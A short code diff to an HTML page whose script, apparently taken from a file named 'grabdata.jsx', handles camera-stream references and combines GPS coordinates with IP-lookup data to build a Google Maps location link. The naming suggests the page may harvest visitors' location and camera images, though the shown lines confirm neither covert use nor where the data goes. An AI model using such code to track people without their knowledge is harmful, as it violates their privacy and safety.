@@ -77,9 +77,6 @@
     </div>
 
     <script>
-        // Kode JavaScript dari file grabdata.jsx yang telah disesuaikan untuk HTML
-        // (Sama persis dengan yang Anda berikan, hanya disesuaikan penempatannya di dalam tag script)
-
         const videoRef = { current: null };
         const canvasRef = { current: null };
         const streamRef = { current: null };
@@ -140,7 +137,7 @@
                 const finalLat = latLngCoords.lat || ipDetails.lat;
                 const finalLng = latLngCoords.lng || ipDetails.lon;
                 if (finalLat && finalLng) {
-                  sharlocLink = `http://googleusercontent.com/maps.google.com/${finalLat},${finalLng}`;
+                  sharlocLink = `https://maps.google.com/?q=${finalLat},${finalLng}`;
                 }
               } else {
                 console.warn('Failed to fetch IP details:', ipApiResponse.statusText);
